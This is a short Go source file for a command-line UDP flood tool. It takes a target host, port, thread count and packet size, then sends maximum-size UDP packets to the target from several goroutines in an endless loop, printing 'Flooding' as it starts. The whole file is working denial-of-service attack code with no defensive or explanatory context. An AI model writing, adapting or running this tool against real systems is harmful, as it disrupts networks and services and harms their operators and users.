package main

import (
    "gopkg.in/alecthomas/kingpin.v2"
    "net"
    "fmt"
)

func main () {
    //Parse command line flags
    var (
        _host     = kingpin.Flag("host", "Hostname").Short('h').Required().String()
        _port     = kingpin.Flag("port", "Port number").Short('p').Required().Int()
        _threads     = kingpin.Flag("threads", "Thread count").Short('t').Default("1").Int()
        _size     = kingpin.Flag("size", "Packet Size").Short('s').Default("65507").Int()
    )
    kingpin.Parse()

    fullAddr := fmt.Sprintf("%s:%v", *_host, *_port)
    //Create send buffer
    var buf []byte = make([]byte, *_size)

    //Establish udp
    conn, err := net.Dial("udp", fullAddr); if err != nil {
        fmt.Println(err)
    } else {
        fmt.Printf("Flooding %s\n", fullAddr)
        for i := 0; i < *_threads; i++ {
            go func(){
                for {
                    conn.Write(buf)
                }
            }()
        }
    }

    //Sleep forever
    <-make(chan bool, 1)
}
